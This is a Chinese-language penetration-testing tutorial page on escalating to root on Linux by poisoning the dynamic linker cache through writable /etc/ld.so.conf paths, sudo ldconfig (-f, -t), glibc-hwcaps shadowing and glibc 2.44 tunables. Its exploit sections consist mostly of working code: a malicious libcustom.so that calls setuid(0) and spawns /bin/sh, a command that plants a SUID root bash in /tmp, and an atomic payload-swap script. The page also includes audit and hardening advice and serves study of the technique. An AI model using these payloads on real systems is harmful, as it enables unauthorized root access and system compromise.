# ld.so 提权 exploit 示例

{{#include ../../banners/hacktricks-training.md}}

本页面专门介绍如何通过污染 **系统 linker 缓存，使用 `/etc/ld.so.conf` 或 `ldconfig`**。有关缺失 library 注入、可写的 `RPATH`/`RUNPATH`、`LD_PRELOAD` 以及其他通用 SUID linker 滥用方法，请参阅 [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md)。

## 准备环境

以下部分包含用于准备环境的文件代码。

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. 在同一文件夹中将这些文件**创建**到你的机器上
2. **编译** **library**：`gcc -shared -o libcustom.so -fPIC libcustom.c`
3. 将 `libcustom.so` **复制**到 `/usr/lib` 并刷新缓存：`sudo cp libcustom.so /usr/lib && sudo ldconfig`（需要 root privs）
4. **编译** **executable**：`gcc sharedvuln.c -o sharedvuln -lcustom`

### 检查环境

检查 _libcustom.so_ 是否从 _/usr/lib_ **加载**，以及你是否可以**执行**该 binary。
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### 有用的 triage 命令

攻击真实目标时，请验证二进制文件所需的**确切库名称**、loader **当前正在解析的内容**，以及哪些已配置路径可写，同时不要修改正在使用的 cache。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
仅对**受信任**的可执行文件使用 `ldd`。某些实现或异常的 ELF interpreter 可能导致其执行攻击者控制的代码；`objdump -p ./file | grep NEEDED` 可以安全地列出直接依赖项。对于受信任的目标，使用发现的 interpreter 调用 `--list` 可显示实际的解析结果。将该输出与 `--inhibit-cache --list` 的输出进行比较：如果存在差异，则证明是 `/etc/ld.so.cache`，而不是普通的搜索路径规则，选择了该 object。<sup>[[1]](#references)[[4]](#references)</sup>

一些有用的注意事项：

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` 通常**不起作用**，因为重定向由当前 shell 执行。应改用
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`。
- **SUID/特权** binaries 会以**安全执行模式**运行：`LD_LIBRARY_PATH`
会被忽略，而 `LD_PRELOAD` 会受到限制（包含斜杠的名称会被忽略，只有位于标准目录中且设置了 setuid 标记的 libraries 才能被 preload）。root 运行 `ldconfig` 后，`/etc/ld.so.conf` 中列出的目录可以进入 `/etc/ld.so.cache`，因此这种 misconfiguration 仍可能影响特权程序。<sup>[[1]](#references)[[2]](#references)</sup>
- 在安全执行模式下，`LD_DEBUG` 同样会被忽略，除非存在 `/etc/suid-debug`；因此应从等效的非 SUID 运行中收集其 trace，而不要期待特权执行产生输出。<sup>[[1]](#references)</sup>
- 在 glibc 2.33 及更高版本中，dynamic loader 还提供
`--list-diagnostics`，当 hijack 的行为不符合预期时，它会输出 machine-readable 的 loader diagnostics 和内置搜索路径信息。<sup>[[1]](#references)[[6]](#references)</sup>

### Cache 和 SONAME 约束

`ldconfig` 不会缓存 configured directory 中的每个 arbitrary file：它会检查 ELF headers，识别名称匹配 `lib*.so*` 或 `ld-*.so*` 的文件，并要求使用常规的 `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` 链。因而，注入的 object 必须具有目标 architecture/class、准确的 `DT_NEEDED` 名称（通常是其 `DT_SONAME`），以及 victim 所解析的所有 symbols/versions。<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
优先使用面向目标的 library，例如此示例。使用不完整的 object 覆盖常见的 SONAME，可能会破坏所有在预期的 privileged target 运行前解析该 SONAME 的进程。<sup>[[3]](#references)</sup>

### 缓存路径持久性与原子替换

缓存记录的是 **library name 到 pathname** 的映射；它不会嵌入 shared object。攻击者控制的 pathname 被缓存后，在该确切路径替换 object，即可影响新启动的进程，而无需再次运行 `ldconfig`。这实现了一种实用的 time-of-check/time-of-use 模式：在 administrator 重建或检查缓存期间提供一个有效的 library，然后将 payload 原子重命名并覆盖到该路径。现有进程会继续使用其已经映射的 object。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
同样，仅从 `ld.so.conf` 中删除恶意行，并不会自行移除已经写入的条目：管理员必须删除不受信任的对象，修复所有权和写入权限，并重建缓存。使用上面的 `--inhibit-cache` 对比来区分陈旧的缓存条目和仍处于活动状态的配置路径。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

在此场景中，假设管理员已将一个存在漏洞的条目添加到 `/etc/ld.so.conf.d/` 下的某个文件中，而系统的 `/etc/ld.so.conf` 包含了该文件。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
存在漏洞的文件夹是 _/home/ubuntu/lib_（我们对其具有可写访问权限）。\
**在该路径内下载并编译**以下代码：
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
如果你预计 **root**（或其他特权账户）稍后会执行这个存在漏洞的二进制文件，通常最好留下一个 **root-owned artifact**，而不是生成交互式 shell。例如：
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
然后，在特权执行发生后，你可以使用 `/tmp/rootbash -p`。

现在，我们已经在配置错误的路径中**创建了恶意的 libcustom 库**，必须通过一次成功的特权 **`ldconfig`** 运行来重建默认缓存。只有在本地启动过程确实会调用它的情况下，重启才会有所帮助；否则，请等待管理员执行相关操作，或在可用时使用不安全的 sudo 规则。<sup>[[2]](#references)</sup>

完成后，**重新检查** `sharedvuln` 可执行文件从何处加载 `libcustom.so` 库：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
如你所见，它正从 **`/home/ubuntu/lib`** 加载；如果任何用户执行它，就会执行一个 shell：
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> 请注意，在此示例中我们尚未提升权限，但通过修改执行的命令，并**等待 root 或其他特权用户执行存在漏洞的二进制文件**，我们将能够提升权限。

### 现代 `glibc-hwcaps` shadowing

自 glibc 2.33 起，loader 可以优先使用每个**库搜索目录**中 `glibc-hwcaps/<level>/` 下的优化库。因此，仅检查 `/home/ubuntu/lib` 是不够的：可写且兼容的子目录，例如 `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`，在 `ldconfig` 为其建立索引后，便可以 shadow 基础库，而其他 CPU 仍会继续使用基础对象。这还提供了一种架构选择性劫持方式，在不同 CPU 上进行验证时可能会被遗漏。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
当前 glibc hardening 指南建议避免重复的 SONAME、非默认搜索位置，以及 `glibc-hwcaps` 子目录中的对象。从 audit 角度来看，应递归地对已配置目录及其父路径组件执行所有权和可写性检查。<sup>[[3]](#references)</sup>

### 其他错误配置 - 同一漏洞

在前一个示例中，我们模拟了这样一种错误配置：管理员**在 `/etc/ld.so.conf.d/` 内的配置文件中设置了一个非特权文件夹**。\
但还有其他错误配置也会导致同一漏洞：如果你对已加载的**配置文件**具有**写权限**，可以在可写的 `/etc/ld.so.conf.d/` 目录中创建文件，或者可以写入 `/etc/ld.so.conf`，就可以配置并利用同一漏洞。<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**假设你对 `ldconfig` 具有 sudo 权限**。`ldconfig` 接受作为位置参数提供的扫描目录，因此最简短的 cache-poisoning 形式通常就是：<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
或者，`-f` 会选择另一个配置文件，同时保留默认的缓存输出。这在参数过滤器阻止位置目录但仍允许使用 `-f` 时，或必须注入多个路径时非常有用：<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
现在，如 **previous exploit** 中所示，**在 `/tmp` 内创建 malicious library**。\
最后，让我们加载该路径，并检查 binary 从哪里加载 library：
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**如你所见，拥有针对 `ldconfig` 的 sudo 权限同样可以利用这一漏洞。** 在评估受限 sudo 规则时，选项细节非常重要：`-f` 会选择其他配置文件，但仍会重建 `/etc/ld.so.cache`；`-C` 会将缓存重定向到其他位置；`-N` 会阻止重建缓存；而 `-X` 会阻止更新链接，但**仍会重建缓存，除非与 `-N` 结合使用**。`-n` 隐含 `-N`，因此它可以更新所提供目录中的链接，但无法污染缓存；`-r` 在备用根目录下运行，通常不会更改主机缓存。<sup>[[2]](#references)</sup>

## glibc 2.44：缓存的系统范围 tunables

从 glibc 2.44 开始，`ldconfig` 还会解析 `/etc/tunables.conf`，并将其设置作为扩展存储在 `/etc/ld.so.cache` 中。该文件接受 `include` 指令和按进程过滤器。前缀用于控制作用范围：`@` 仅针对 `AT_SECURE` 进程，`$` 排除这些进程，而 `*` 覆盖两者。这使审计边界扩展到库目录之外：可写的 tunables 配置文件或其中包含的文件，可以在特权缓存重建后影响后续程序启动。<sup>[[7]](#references)</sup>

同一版本新增了 `ldconfig -t TUNCONF`，它可以选择备用 tunables 文件，但仍会写入正常缓存，除非其他选项改变了这一行为。因此，试图仅阻止 `-f` 的 wrapper 和 sudo 规则还必须拒绝 `-t`、任意位置参数目录以及缓存输出操纵。<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
这并不是自动执行任意代码。这是一种特权的 **loader-behavior manipulation** 原语：glibc 明确警告，系统范围的值可能会将对安全敏感的 tunables 应用于 setuid/setgid 程序，而不会针对每个 tunable 进行安全筛选。使用 `--list-tunables` 枚举主机实际的 tunables，并寻找针对目标的 allocator 更改、CPU 加固更改或拒绝服务条件，而不是假设存在通用 payload。<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
